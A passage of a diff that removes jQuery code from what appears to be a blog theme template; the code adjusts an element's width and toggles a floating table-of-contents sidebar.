-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
 
     
 
